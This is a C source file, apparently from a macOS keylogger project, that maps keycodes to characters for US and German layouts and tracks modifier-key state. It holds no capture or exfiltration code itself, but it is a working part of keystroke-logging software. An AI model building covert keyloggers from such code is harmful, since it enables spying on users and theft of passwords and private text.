#include "keylogger.h"

bool shift = false;
bool cmd = false;
bool option = false;
bool ctrl = false;
bool caps = false;

char *key;

// TODO: Shift + Caps zsm aktiviert!
char * UStoString (CGKeyCode keyCode) {

    key = "<unknown>";

    switch ((int) keyCode) {
      case   0:
            key = (caps | shift) ? "A" : "a";
            break;
      case   1:
            key = (caps | shift) ? "S" : "s";
            break;
      case   2:
            key = (caps | shift) ? "D" : "d";
            break;
      case   3:
            key = (caps | shift) ? "F" : "f";
            break;
      case   4:
            key = (caps | shift) ? "H" : "h";
            break;
      case   5:
            key = (caps | shift) ? "G" : "g";
            break;
      case   6:
            key = (caps | shift) ? "Z" : "z";
            break;
      case   7:
            key = (caps | shift) ? "X" : "x";
            break;
      case   8:
            key = (caps | shift) ? "C" : "c";
            break;
      case   9:
            key = (caps | shift) ? "V" : "v";
            break;
      case  11:
            key = (caps | shift) ? "B" : "b";
            break;
      case  12:
            key = (caps | shift) ? "Q" : "q";
            break;
      case  13:
            key = (caps | shift) ? "W" : "w";
            break;
      case  14:
            key = (caps | shift) ? "E" : "e";
            break;
      case  15:
            key = (caps | shift) ? "R" : "r";
            break;
      case  16:
            key = (caps | shift) ? "Y" : "y";
            break;
      case  17:
            key = (caps | shift) ? "T" : "t";
            break;
      case  18:
            key = (caps | shift) ? "!" : "1";
            break;
      case  19:
            key = (caps | shift) ? "@" : "2";
            break;
      case  20:
            key = (caps | shift) ? "#" : "3";
            break;
      case  21:
            key = (caps | shift) ? "$" : "4";
            break;
      case  22:
            key = (caps | shift) ? "^" : "6";
            break;
      case  23:
            key = (caps | shift) ? "%%" : "5";
            break;
      case  24:
            key = (caps | shift) ? "+" : "=";
            break;
      case  25:
            key = (caps | shift) ? "(" : "9";
            break;
      case  26:
            key = (caps | shift) ? "&" : "7";
            break;
      case  27:
            key = (caps | shift) ? "–" : "-";
            break;
      case  28:
            key = (caps | shift) ? "*" : "8";
            break;
      case  29:
            key = (caps | shift) ? ")" : "0";
            break;
      case  30:
            key = (caps | shift) ? "}" : "]";
            break;
      case  31:
            key = (caps | shift) ? "O" : "o";
            break;
      case  32:
            key = (caps | shift) ? "U" : "u";
            break;
      case  33:
            key = (caps | shift) ? "{" : "[";
            break;
      case  34:
            key = (caps | shift) ? "I" : "i";
            break;
      case  35:
            key = (caps | shift) ? "P" : "p";
            break;
      case  36:
            return autoread ? "\n" : "<return>";
      case  37:
            key = (caps | shift) ? "L" : "l";
            break;
      case  38:
            key = (caps | shift) ? "J" : "j";
            break;
      case  39:
            key = (caps | shift) ? "\"" : "\'";
            break;
      case  40:
            key = (caps | shift) ? "K" : "k";
            break;
      case  41:
            key = (caps | shift) ? ":" : ";";
            break;
      case  42:
            key = (caps | shift) ? "|" : "\\";
            break;
      case  43:
            key = (caps | shift) ? "<" : ",";
            break;
      case  44:
            key = (caps | shift) ? "?" : "/";
            break;
      case  45:
            key = (caps | shift) ? "N" : "n";
            break;
      case  46:
            key = (caps | shift) ? "M" : "m";
            break;
      case  47:
            key = (caps | shift) ? ">" : ".";
            break;
      case  48:
            return autoread ? "\t" : "<tab>";
      case  49:
            return autoread ? " " : "<space>";
      case  50:
            key = (caps | shift) ? "~" : "`";
            break;
      case  51: return "<delete>"; // TODO: autoread
      case  53: return "<escape>";
      case  55:
            if (autoread) {
                cmd = true;
                return "";
            }else{
                return "<command>";
            }
      case  56:
            if (autoread) {
                shift = true;
                return "";
            }else{
                return "<shift>";
            }
      case  57:
            if (autoread) {
                caps = !caps;
                return "";
            }else{
                return "<capslock>";
            }
      case  58:
            if (autoread) {
                option = !option;
                if (option) {
                    return "<Option>";
                }else{
                    return "";
                }
            }else{
                return "<Option>";
            }
      case  59:
            if (autoread) {
                ctrl = !ctrl;
                return "";
            }else{
                return "<Control>";
            }
      case  60:
            if (autoread) {
                shift = !shift;
                return "";
            }else{
                return "<Right Shift>";
            }
      case  61:
            if (autoread) {
                option = !option;
                if (option) {
                    return "<Option>";
                }else{
                    return "";
                }
            }else{
                return "<Option>";
            }
      case  62:
            if (autoread) {
                ctrl = !ctrl;
                return "";
            }else{
                return "<Right Control>";
            }
      case  63: return "<Function>";
      case  64: return "<F17>";
      case  72: return "<Volume Up>";
      case  73: return "<Volume Down>";
      case  74: return "<mute>";
      case  79: return "<F18>";
      case  80: return "<F19>";
      case  90: return "<F20>";
      case  96: return "<F5>";
      case  97: return "<F6>";
      case  98: return "<F7>";
      case  99: return "<F3>";
      case 100: return "<F8>";
      case 101: return "<F9>";
      case 103: return "<F11>";
      case 105: return "<F13>";
      case 106: return "<F16>";
      case 107: return "<F14>";
      case 109: return "<F10>";
      case 111: return "<F12>";
      case 113: return "<F15>";
      case 116: return "Page Up";
      case 118: return "<F4>";
      case 119: return "<End>";
      case 120: return "<F2>";
      case 121: return "<Page Down>";
      case 122: return "<F1>";
      case 123: return "<Left>";
      case 124: return "<Right>";
      case 125: return "<Down>";
      case 126: return "<Up>";
      default: return "<unknown>";
    }

    return key;
}

char * DEtoString (CGKeyCode keyCode){

    key = "<unknown>";

    switch ((int) keyCode) {
      case   0:
            key = (caps | shift) ? "A" : "a";
            break;
      case   1:
            key = (caps | shift) ? "S" : "s";
            break;
      case   2:
            key = (caps | shift) ? "D" : "d";
            break;
      case   3:
            key = (caps | shift) ? "F" : "f";
            break;
      case   4:
            key = (caps | shift) ? "H" : "h";
            break;
      case   5:
            key = (caps | shift) ? "G" : "g";
            break;
      case   6:
            key = (caps | shift) ? "Y" : "y";
            break;
      case   7:
            key = (caps | shift) ? "X" : "x";
            break;
      case   8:
            key = (caps | shift) ? "C" : "c";
            break;
      case   9:
            key = (caps | shift) ? "V" : "v";
            break;
      case  11:
            key = (caps | shift) ? "B" : "b";
            break;
      case  12:
            key = (caps | shift) ? "Q" : "q";
            break;
      case  13:
            key = (caps | shift) ? "W" : "w";
            break;
      case  14:
            key = (caps | shift) ? "E" : "e";
            break;
      case  15:
            key = (caps | shift) ? "R" : "r";
            break;
      case  16:
            key = (caps | shift) ? "Z" : "z";
            break;
      case  17:
            key = (caps | shift) ? "T" : "t";
            break;
      case  18:
            key = (caps | shift) ? "!" : "1";
            break;
      case  19:
            key = (caps | shift) ? "\"" : "2";
            break;
      case  20:
            key = (caps | shift) ? "§" : "3";
            break;
      case  21:
            key = (caps | shift) ? "$" : "4";
            break;
      case  22:
            key = (caps | shift) ? "&" : "6";
            break;
      case  23:
            key = (caps | shift) ? "%%" : "5";
            break;
      case  24:
            key = (caps | shift) ? "`" : "´";
            break;
      case  25:
            key = (caps | shift) ? ")" : "9";
            break;
      case  26:
            key = (caps | shift) ? "/" : "7";
            break;
      case  27:
            key = (caps | shift) ? "?" : "ss"; // sharp s
            break;
      case  28:
            key = (caps | shift) ? "(" : "8";
            break;
      case  29:
            key = (caps | shift) ? "=" : "0";
            break;
      case  30:
            key = (caps | shift) ? "*" : "+";
            break;
      case  31:
            key = (caps | shift) ? "O" : "o";
            break;
      case  32:
            key = (caps | shift) ? "U" : "u";
            break;
      case  33:
            key = (caps | shift) ? "UE" : "ue";
            break;
      case  34:
            key = (caps | shift) ? "I" : "i";
            break;
      case  35:
            key = (caps | shift) ? "P" : "p";
            break;
      case  36:
            return autoread ? "\n" : "<return>";
      case  37:
            key = (caps | shift) ? "L" : "l";
            break;
      case  38:
            key = (caps | shift) ? "J" : "j";
            break;
      case  39:
            key = (caps | shift) ? "AE" : "ae";
            break;
      case  40:
            key = (caps | shift) ? "K" : "k";
            break;
      case  41:
            key = (caps | shift) ? "OE" : "oe";
            break;
      case  42:
            key = (caps | shift) ? "'" : "#";
            break;
      case  43:
            key = (caps | shift) ? ";" : ",";
            break;
      case  44:
            key = (caps | shift) ? "_" : "-";
            break;
      case  45:
            key = (caps | shift) ? "N" : "n";
            break;
      case  46:
            key = (caps | shift) ? "M" : "m";
            break;
      case  47:
            key = (caps | shift) ? ":" : ".";
            break;
      case  48:
            return autoread ? "\t" : "<tab>";
      case  49:
            return autoread ? " " : "<space>";
      case  50:
            key = (caps | shift) ? ">" : "<";
            break;
      case  51: return "<delete>"; // TODO: autoread
      case  53: return "<escape>";
      case  55:
            if (autoread) {
                cmd = !cmd;
                return "";
            }else{
                return "<command>";
            }
      case  56:
            if (autoread) {
                shift = !shift;
                return "";
            }else{
                return "<shift>";
            }
      case  57:
            if (autoread) {
                caps = !caps;
                return "";
            }else{
                return "<capslock>";
            }
      case  58:
            if (autoread) {
                option = !option;
                if (option) {
                    return "<Option>";
                }else{
                    return "";
                }
            }else{
                return "<Option>";
            }
      case  59:
            if (autoread) {
                ctrl = !ctrl;
                return "";
            }else{
                return "<Control>";
            }
      case  60:
            if (autoread) {
                shift = !shift;
                return "";
            }else{
                return "<Right Shift>";
            }
      case  61:
            if (autoread) {
                option = !option;
                if (option) {
                    return "<Option>";
                }else{
                    return "";
                }
            }else{
                return "<Option>";
            }
      case  62:
            if (autoread) {
                ctrl = !ctrl;
                return "";
            }else{
                return "<Right Control>";
            }
      case  63: return "<Function>";
      case  64: return "<F17>";
      case  72: return "<Volume Up>";
      case  73: return "<Volume Down>";
      case  74: return "<mute>";
      case  79: return "<F18>";
      case  80: return "<F19>";
      case  90: return "<F20>";
      case  96: return "<F5>";
      case  97: return "<F6>";
      case  98: return "<F7>";
      case  99: return "<F3>";
      case 100: return "<F8>";
      case 101: return "<F9>";
      case 103: return "<F11>";
      case 105: return "<F13>";
      case 106: return "<F16>";
      case 107: return "<F14>";
      case 109: return "<F10>";
      case 111: return "<F12>";
      case 113: return "<F15>";
      case 116: return "Page Up";
      case 118: return "<F4>";
      case 119: return "<End>";
      case 120: return "<F2>";
      case 121: return "<Page Down>";
      case 122: return "<F1>";
      case 123: return "<Left>";
      case 124: return "<Right>";
      case 125: return "<Down>";
      case 126: return "<Up>";
      default: return "<unknown>";
    }

    return key;
}

char * keycodeToString (CGKeyCode keycode){

    if (layout_switch) {
        if (strcmp(layout, "U.S.") == 0) {
            return UStoString(keycode);
        }else if(strcmp(layout, "German") == 0){
            return DEtoString(keycode);
        }
    }

    return UStoString(keycode);
}
